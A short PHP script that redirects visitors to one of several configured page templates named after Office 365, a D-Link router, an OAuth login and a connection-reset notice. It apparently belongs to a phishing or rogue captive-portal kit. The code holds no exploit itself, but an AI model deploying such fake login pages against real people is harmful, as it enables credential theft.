<?php 
$json = json_decode(file_get_contents("config.json"), true);
switch ($json['page']) {
    case "1":
		header("Location: pages/office365/index.html"); 
		break;
    case "2":
		header("Location: pages/connection_reset/index.html"); 
		break;
    case "3":
		header("Location: pages/minimal/index.html"); 
		break;
    case "4":
		header("Location: pages/dlink/"); 
		break;
    case "5":
		header("Location: pages/oauth-login");
		break;
    default:
		header("Location: install/");
}

